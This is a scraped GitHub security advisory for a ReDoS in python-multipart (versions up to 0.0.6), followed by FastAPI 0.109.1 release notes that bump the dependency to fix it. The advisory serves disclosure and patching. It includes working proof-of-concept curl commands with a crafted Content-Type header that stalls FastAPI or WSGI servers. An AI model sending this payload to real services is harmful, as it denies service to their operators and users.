=== Content from github.com_3053ad54_20250114_181319.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKludex%2Fpython-multipart%2Fsecurity%2Fadvisories%2FGHSA-2jv5-9r88-3w3p)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKludex%2Fpython-multipart%2Fsecurity%2Fadvisories%2FGHSA-2jv5-9r88-3w3p)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=Kludex%2Fpython-multipart)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Kludex](/Kludex)
/
**[python-multipart](/Kludex/python-multipart)**
Public

* [Notifications](/login?return_to=%2FKludex%2Fpython-multipart) You must be signed in to change notification settings
* [Fork
  63](/login?return_to=%2FKludex%2Fpython-multipart)
* [Star
   367](/login?return_to=%2FKludex%2Fpython-multipart)

* [Code](/Kludex/python-multipart)
* [Issues
  9](/Kludex/python-multipart/issues)
* [Pull requests
  8](/Kludex/python-multipart/pulls)
* [Actions](/Kludex/python-multipart/actions)
* [Security](/Kludex/python-multipart/security)
* [Insights](/Kludex/python-multipart/pulse)

Additional navigation options

* [Code](/Kludex/python-multipart)
* [Issues](/Kludex/python-multipart/issues)
* [Pull requests](/Kludex/python-multipart/pulls)
* [Actions](/Kludex/python-multipart/actions)
* [Security](/Kludex/python-multipart/security)
* [Insights](/Kludex/python-multipart/pulse)

# Content-Type Header ReDoS

High

[Kludex](/Kludex)
published
GHSA-2jv5-9r88-3w3p
Feb 12, 2024

## Package

pip

python-multipart
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<=0.0.6

## Patched versions

0.0.7

## Description

### Summary

When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.

An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.

This can create a ReDoS (Regular expression Denial of Service): <https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS>

This only applies when the app uses form data, parsed with `python-multipart`.

### Details

A regular HTTP `Content-Type` header could look like:

```
Content-Type: text/html; charset=utf-8

```

`python-multipart` parses the option with this RegEx: <https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74>

A custom option could be made and sent to the server to break it with:

```
Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

```
### PoC

Create a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:

```
# main.py
from wsgiref.simple_server import make_server
from wsgiref.validate import validator

from multipart.multipart import parse_options_header

def simple_app(environ, start_response):
    _, _ = parse_options_header(environ["CONTENT_TYPE"])

    start_response("200 OK", [("Content-type", "text/plain")])
    return [b"Ok"]

httpd = make_server("", 8123, validator(simple_app))
print("Serving on port 8123...")
httpd.serve_forever()
```

Then send the attacking request with:

```
$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'
```
### Impact

It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.

### Original Report

This was originally reported to FastAPI as an email to security@tiangolo.com, sent via <https://huntr.com/>, the original reporter is Marcello, <https://github.com/byt3bl33d3r>

Original report to FastAPI

Hey Tiangolo!

My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from [@nicecatch2000](https://github.com/nicecatch2000)) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).

Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:

```
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse("Test", status_code=200)

@app.post("/submit/")
async def submit(username: Annotated[str, Form()]):
    return {"username": username}

@app.post("/submit_json/")
async def submit_json(item: Item):
    return {"username": item.username}
```

I'm running the above with uvicorn with the following command:

```
uvicorn server:app
```

Then run the following cUrl command:

```
curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'

```

You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%

You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.

If you try submitting Json to the /submit\_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.

Cheers

#### Impact

An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.

#### Occurrences

[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)

### Severity

High

7.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
None

Integrity
None

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### CVE ID

No known CVE

### Weaknesses

No CWEs

### Credits

* [![@nicecatch2000](https://avatars.githubusercontent.com/u/66583563?s=40&v=4)](/nicecatch2000)
  [nicecatch2000](/nicecatch2000)
  Finder
* [![@Kludex](https://avatars.githubusercontent.com/u/7353520?s=40&v=4)](/Kludex)
  [Kludex](/Kludex)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7ecf812b_20250114_181324.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffastapi%2Ffastapi%2Freleases%2Ftag%2F0.109.1)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffastapi%2Ffastapi%2Freleases%2Ftag%2F0.109.1)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=fastapi%2Ffastapi)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[fastapi](/fastapi)
/
**[fastapi](/fastapi/fastapi)**
Public

* [Notifications](/login?return_to=%2Ffastapi%2Ffastapi) You must be signed in to change notification settings
* [Fork
  6.8k](/login?return_to=%2Ffastapi%2Ffastapi)
* [Star
   79.5k](/login?return_to=%2Ffastapi%2Ffastapi)

* [Code](/fastapi/fastapi/tree/0.109.1)
* [Issues
  51](/fastapi/fastapi/issues)
* [Pull requests
  273](/fastapi/fastapi/pulls)
* [Discussions](/fastapi/fastapi/discussions)
* [Actions](/fastapi/fastapi/actions)
* [Projects
  0](/fastapi/fastapi/projects)
* [Security](/fastapi/fastapi/security)
* [Insights](/fastapi/fastapi/pulse)

Additional navigation options

* [Code](/fastapi/fastapi/tree/0.109.1)
* [Issues](/fastapi/fastapi/issues)
* [Pull requests](/fastapi/fastapi/pulls)
* [Discussions](/fastapi/fastapi/discussions)
* [Actions](/fastapi/fastapi/actions)
* [Projects](/fastapi/fastapi/projects)
* [Security](/fastapi/fastapi/security)
* [Insights](/fastapi/fastapi/pulse)

1. [Releases](/fastapi/fastapi/releases)
2. [0.109.1](/fastapi/fastapi/releases/tag/0.109.1)

# 0.109.1

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/fastapi/fastapi/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...0.109.1)

 Loading

[View all tags](/fastapi/fastapi/tags)

![@tiangolo](https://avatars.githubusercontent.com/u/1326112?s=40&v=4)
[tiangolo](/tiangolo)
released this
03 Feb 12:43

·
[1661 commits](/fastapi/fastapi/compare/0.109.1...master)
to master
since this release

[0.109.1](/fastapi/fastapi/tree/0.109.1)

[`7633d15`](/fastapi/fastapi/commit/7633d1571cc0c2792b766f67172edb9427c66899)

### Security fixes

* ⬆️ Upgrade minimum version of `python-multipart` to `>=0.0.7` to fix a vulnerability when using form data with a ReDos attack. You can also simply upgrade `python-multipart`.

Read more in the [advisory: Content-Type Header ReDoS](https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389).

### Features

* ✨ Include HTTP 205 in status codes with no body. PR [#10969](https://github.com/tiangolo/fastapi/pull/10969) by [@tiangolo](https://github.com/tiangolo).

### Refactors

* ✅ Refactor tests for duplicate operation ID generation for compatibility with other tools running the FastAPI test suite. PR [#10876](https://github.com/tiangolo/fastapi/pull/10876) by [@emmettbutler](https://github.com/emmettbutler).
* ♻️ Simplify string format with f-strings in `fastapi/utils.py`. PR [#10576](https://github.com/tiangolo/fastapi/pull/10576) by [@eukub](https://github.com/eukub).
* 🔧 Fix Ruff configuration unintentionally enabling and re-disabling mccabe complexity check. PR [#10893](https://github.com/tiangolo/fastapi/pull/10893) by [@jiridanek](https://github.com/jiridanek).
* ✅ Re-enable test in `tests/test_tutorial/test_header_params/test_tutorial003.py` after fix in Starlette. PR [#10904](https://github.com/tiangolo/fastapi/pull/10904) by [@ooknimm](https://github.com/ooknimm).

### Docs

* 📝 Tweak wording in `help-fastapi.md`. PR [#11040](https://github.com/tiangolo/fastapi/pull/11040) by [@tiangolo](https://github.com/tiangolo).
* 📝 Tweak docs for Behind a Proxy. PR [#11038](https://github.com/tiangolo/fastapi/pull/11038) by [@tiangolo](https://github.com/tiangolo).
* 📝 Add External Link: 10 Tips for adding SQLAlchemy to FastAPI. PR [#11036](https://github.com/tiangolo/fastapi/pull/11036) by [@Donnype](https://github.com/Donnype).
* 📝 Add External Link: Tips on migrating from Flask to FastAPI and vice-versa. PR [#11029](https://github.com/tiangolo/fastapi/pull/11029) by [@jtemporal](https://github.com/jtemporal).
* 📝 Deprecate old tutorials: Peewee, Couchbase, encode/databases. PR [#10979](https://github.com/tiangolo/fastapi/pull/10979) by [@tiangolo](https://github.com/tiangolo).
* ✏️ Fix typo in `fastapi/security/oauth2.py`. PR [#10972](https://github.com/tiangolo/fastapi/pull/10972) by [@RafalSkolasinski](https://github.com/RafalSkolasinski).
* 📝 Update `HTTPException` details in `docs/en/docs/tutorial/handling-errors.md`. PR [#5418](https://github.com/tiangolo/fastapi/pull/5418) by [@papb](https://github.com/papb).
* ✏️ A few tweaks in `docs/de/docs/tutorial/first-steps.md`. PR [#10959](https://github.com/tiangolo/fastapi/pull/10959) by [@nilslindemann](https://github.com/nilslindemann).
* ✏️ Fix link in `docs/en/docs/advanced/async-tests.md`. PR [#10960](https://github.com/tiangolo/fastapi/pull/10960) by [@nilslindemann](https://github.com/nilslindemann).
* ✏️ Fix typos for Spanish documentation. PR [#10957](https://github.com/tiangolo/fastapi/pull/10957) by [@jlopezlira](https://github.com/jlopezlira).
* 📝 Add warning about lifespan functions and backwards compatibility with events. PR [#10734](https://github.com/tiangolo/fastapi/pull/10734) by [@jacob-indigo](https://github.com/jacob-indigo).
* ✏️ Fix broken link in `docs/tutorial/sql-databases.md` in several languages. PR [#10716](https://github.com/tiangolo/fastapi/pull/10716) by [@theoohoho](https://github.com/theoohoho).
* ✏️ Remove broken links from `external_links.yml`. PR [#10943](https://github.com/tiangolo/fastapi/pull/10943) by [@Torabek](https://github.com/Torabek).
* 📝 Update template docs with more info about `url_for`. PR [#5937](https://github.com/tiangolo/fastapi/pull/5937) by [@EzzEddin](https://github.com/EzzEddin).
* 📝 Update usage of Token model in security docs. PR [#9313](https://github.com/tiangolo/fastapi/pull/9313) by [@piotrszacilowski](https://github.com/piotrszacilowski).
* ✏️ Update highlighted line in `docs/en/docs/tutorial/bigger-applications.md`. PR [#5490](https://github.com/tiangolo/fastapi/pull/5490) by [@papb](https://github.com/papb).
* 📝 Add External Link: Explore How to Effectively Use JWT With FastAPI. PR [#10212](https://github.com/tiangolo/fastapi/pull/10212) by [@aanchlia](https://github.com/aanchlia).
* 📝 Add hyperlink to `docs/en/docs/tutorial/static-files.md`. PR [#10243](https://github.com/tiangolo/fastapi/pull/10243) by [@hungtsetse](https://github.com/hungtsetse).
* 📝 Add External Link: Instrument a FastAPI service adding tracing with OpenTelemetry and send/show traces in Grafana Tempo. PR [#9440](https://github.com/tiangolo/fastapi/pull/9440) by [@softwarebloat](https://github.com/softwarebloat).
* 📝 Review and rewording of `en/docs/contributing.md`. PR [#10480](https://github.com/tiangolo/fastapi/pull/10480) by [@nilslindemann](https://github.com/nilslindemann).
* 📝 Add External Link: ML serving and monitoring with FastAPI and Evidently. PR [#9701](https://github.com/tiangolo/fastapi/pull/9701) by [@mnrozhkov](https://github.com/mnrozhkov).
* 📝 Reword in docs, from "have in mind" to "keep in mind". PR [#10376](https://github.com/tiangolo/fastapi/pull/10376) by [@malicious](https://github.com/malicious).
* 📝 Add External Link: Talk by Jeny Sadadia. PR [#10265](https://github.com/tiangolo/fastapi/pull/10265) by [@JenySadadia](https://github.com/JenySadadia).
* 📝 Add location info to `tutorial/bigger-applications.md`. PR [#10552](https://github.com/tiangolo/fastapi/pull/10552) by [@nilslindemann](https://github.com/nilslindemann).
* ✏️ Fix Pydantic method name in `docs/en/docs/advanced/path-operation-advanced-configuration.md`. PR [#10826](https://github.com/tiangolo/fastapi/pull/10826) by [@ahmedabdou14](https://github.com/ahmedabdou14).

### Translations

* 🌐 Add Spanish translation for `docs/es/docs/external-links.md`. PR [#10933](https://github.com/tiangolo/fastapi/pull/10933) by [@pablocm83](https://github.com/pablocm83).
* 🌐 Update Korean translation for `docs/ko/docs/tutorial/first-steps.md`, `docs/ko/docs/tutorial/index.md`, `docs/ko/docs/tutorial/path-params.md`, and `docs/ko/docs/tutorial/query-params.md`. PR [#4218](https://github.com/tiangolo/fastapi/pull/4218) by [@SnowSuno](https://github.com/SnowSuno).
* 🌐 Add Chinese translation for `docs/zh/docs/tutorial/dependencies/dependencies-with-yield.md`. PR [#10870](https://github.com/tiangolo/fastapi/pull/10870) by [@zhiquanchi](https://github.com/zhiquanchi).
* 🌐 Add Chinese translation for `docs/zh/docs/deployment/concepts.md`. PR [#10282](https://github.com/tiangolo/fastapi/pull/10282) by [@xzmeng](https://github.com/xzmeng).
* 🌐 Add Azerbaijani translation for `docs/az/docs/index.md`. PR [#11047](https://github.com/tiangolo/fastapi/pull/11047) by [@aykhans](https://github.com/aykhans).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/middleware.md`. PR [#2829](https://github.com/tiangolo/fastapi/pull/2829) by [@JeongHyeongKim](https://github.com/JeongHyeongKim).
* 🌐 Add German translation for `docs/de/docs/tutorial/body-nested-models.md`. PR [#10313](https://github.com/tiangolo/fastapi/pull/10313) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add Persian translation for `docs/fa/docs/tutorial/middleware.md`. PR [#9695](https://github.com/tiangolo/fastapi/pull/9695) by [@mojtabapaso](https://github.com/mojtabapaso).
* 🌐 Update Farsi translation for `docs/fa/docs/index.md`. PR [#10216](https://github.com/tiangolo/fastapi/pull/10216) by [@theonlykingpin](https://github.com/theonlykingpin).
* 🌐 Add German translation for `docs/de/docs/tutorial/body-fields.md`. PR [#10310](https://github.com/tiangolo/fastapi/pull/10310) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add German translation for `docs/de/docs/tutorial/body.md`. PR [#10295](https://github.com/tiangolo/fastapi/pull/10295) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add German translation for `docs/de/docs/tutorial/body-multiple-params.md`. PR [#10308](https://github.com/tiangolo/fastapi/pull/10308) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/security/get-current-user.md`. PR [#2681](https://github.com/tiangolo/fastapi/pull/2681) by [@sh0nk](https://github.com/sh0nk).
* 🌐 Add Chinese translation for `docs/zh/docs/advanced/advanced-dependencies.md`. PR [#3798](https://github.com/tiangolo/fastapi/pull/3798) by [@jaystone776](https://github.com/jaystone776).
* 🌐 Add Chinese translation for `docs/zh/docs/advanced/events.md`. PR [#3815](https://github.com/tiangolo/fastapi/pull/3815) by [@jaystone776](https://github.com/jaystone776).
* 🌐 Add Chinese translation for `docs/zh/docs/advanced/behind-a-proxy.md`. PR [#3820](https://github.com/tiangolo/fastapi/pull/3820) by [@jaystone776](https://github.com/jaystone776).
* 🌐 Add Chinese translation for `docs/zh/docs/advanced/testing-events.md`. PR [#3818](https://github.com/tiangolo/fastapi/pull/3818) by [@jaystone776](https://github.com/jaystone776).
* 🌐 Add Chinese translation for `docs/zh/docs/advanced/testing-websockets.md`. PR [#3817](https://github.com/tiangolo/fastapi/pull/3817) by [@jaystone776](https://github.com/jaystone776).
* 🌐 Add Chinese translation for `docs/zh/docs/advanced/testing-database.md`. PR [#3821](https://github.com/tiangolo/fastapi/pull/3821) by [@jaystone776](https://github.com/jaystone776).
* 🌐 Add Chinese translation for `docs/zh/docs/deployment/deta.md`. PR [#3837](https://github.com/tiangolo/fastapi/pull/3837) by [@jaystone776](https://github.com/jaystone776).
* 🌐 Add Chinese translation for `docs/zh/docs/history-design-future.md`. PR [#3832](https://github.com/tiangolo/fastapi/pull/3832) by [@jaystone776](https://github.com/jaystone776).
* 🌐 Add Chinese translation for `docs/zh/docs/project-generation.md`. PR [#3831](https://github.com/tiangolo/fastapi/pull/3831) by [@jaystone776](https://github.com/jaystone776).
* 🌐 Add Chinese translation for `docs/zh/docs/deployment/docker.md`. PR [#10296](https://github.com/tiangolo/fastapi/pull/10296) by [@xzmeng](https://github.com/xzmeng).
* 🌐 Update Spanish translation for `docs/es/docs/features.md`. PR [#10884](https://github.com/tiangolo/fastapi/pull/10884) by [@pablocm83](https://github.com/pablocm83).
* 🌐 Add Spanish translation for `docs/es/docs/newsletter.md`. PR [#10922](https://github.com/tiangolo/fastapi/pull/10922) by [@pablocm83](https://github.com/pablocm83).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/background-tasks.md`. PR [#5910](https://github.com/tiangolo/fastapi/pull/5910) by [@junah201](https://github.com/junah201).
* 🌐 Add Turkish translation for `docs/tr/docs/alternatives.md`. PR [#10502](https://github.com/tiangolo/fastapi/pull/10502) by [@alperiox](https://github.com/alperiox).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/dependencies/index.md`. PR [#10989](https://github.com/tiangolo/fastapi/pull/10989) by [@KaniKim](https://github.com/KaniKim).
* 🌐 Add Korean translation for `/docs/ko/docs/tutorial/body.md`. PR [#11000](https://github.com/tiangolo/fastapi/pull/11000) by [@KaniKim](https://github.com/KaniKim).
* 🌐 Add Portuguese translation for `docs/pt/docs/tutorial/schema-extra-example.md`. PR [#4065](https://github.com/tiangolo/fastapi/pull/4065) by [@luccasmmg](https://github.com/luccasmmg).
* 🌐 Add Turkish translation for `docs/tr/docs/history-design-future.md`. PR [#11012](https://github.com/tiangolo/fastapi/pull/11012) by [@hasansezertasan](https://github.com/hasansezertasan).
* 🌐 Add Turkish translation for `docs/tr/docs/resources/index.md`. PR [#11020](https://github.com/tiangolo/fastapi/pull/11020) by [@hasansezertasan](https://github.com/hasansezertasan).
* 🌐 Add Turkish translation for `docs/tr/docs/how-to/index.md`. PR [#11021](https://github.com/tiangolo/fastapi/pull/11021) by [@hasansezertasan](https://github.com/hasansezertasan).
* 🌐 Add German translation for `docs/de/docs/tutorial/query-params.md`. PR [#10293](https://github.com/tiangolo/fastapi/pull/10293) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add German translation for `docs/de/docs/benchmarks.md`. PR [#10866](https://github.com/tiangolo/fastapi/pull/10866) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add Turkish translation for `docs/tr/docs/learn/index.md`. PR [#11014](https://github.com/tiangolo/fastapi/pull/11014) by [@hasansezertasan](https://github.com/hasansezertasan).
* 🌐 Add Persian translation for `docs/fa/docs/tutorial/security/index.md`. PR [#9945](https://github.com/tiangolo/fastapi/pull/9945) by [@mojtabapaso](https://github.com/mojtabapaso).
* 🌐 Add Turkish translation for `docs/tr/docs/help/index.md`. PR [#11013](https://github.com/tiangolo/fastapi/pull/11013) by [@hasansezertasan](https://github.com/hasansezertasan).
* 🌐 Add Turkish translation for `docs/tr/docs/about/index.md`. PR [#11006](https://github.com/tiangolo/fastapi/pull/11006) by [@hasansezertasan](https://github.com/hasansezertasan).
* 🌐 Update Turkish translation for `docs/tr/docs/benchmarks.md`. PR [#11005](https://github.com/tiangolo/fastapi/pull/11005) by [@hasansezertasan](https://github.com/hasansezertasan).
* 🌐 Add Italian translation for `docs/it/docs/index.md`. PR [#5233](https://github.com/tiangolo/fastapi/pull/5233) by [@matteospanio](https://github.com/matteospanio).
* 🌐 Add Korean translation for `docs/ko/docs/help/index.md`. PR [#10983](https://github.com/tiangolo/fastapi/pull/10983) by [@KaniKim](https://github.com/KaniKim).
* 🌐 Add Korean translation for `docs/ko/docs/features.md`. PR [#10976](https://github.com/tiangolo/fastapi/pull/10976) by [@KaniKim](https://github.com/KaniKim).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/security/get-current-user.md`. PR [#5737](https://github.com/tiangolo/fastapi/pull/5737) by [@KdHyeon0661](https://github.com/KdHyeon0661).
* 🌐 Add Russian translation for `docs/ru/docs/tutorial/security/first-steps.md`. PR [#10541](https://github.com/tiangolo/fastapi/pull/10541) by [@AlertRED](https://github.com/AlertRED).
* 🌐 Add Russian translation for `docs/ru/docs/tutorial/handling-errors.md`. PR [#10375](https://github.com/tiangolo/fastapi/pull/10375) by [@AlertRED](https://github.com/AlertRED).
